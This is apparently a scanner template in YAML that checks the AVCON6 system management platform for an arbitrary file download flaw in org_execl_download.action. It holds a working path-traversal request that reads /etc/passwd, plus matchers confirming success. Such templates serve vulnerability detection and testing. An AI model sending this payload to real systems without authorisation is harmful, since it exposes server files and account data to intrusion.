id: avcon6-execl-lfi
name: AVCON6 org_execl_download.action - Arbitrary File Download
severity: high
confidence: confirmed
description: Arbitrary File Download vulnerability in the org_execl_download.action of the AVCON6 system management platform,
  through which an attacker can download arbitrary files from the server
reference: https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/AVCON6%20%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20org_execl_download.action%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md
tags:
- avcon6
- lfi
- vuln
requests:
- method: GET
  path: /org_execl_download.action?filename=../../../../../../../../../../../../../etc/passwd
  matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: header
    words:
    - application/octet-stream
    - filename=
  - type: status
    status:
    - 200
  condition: and
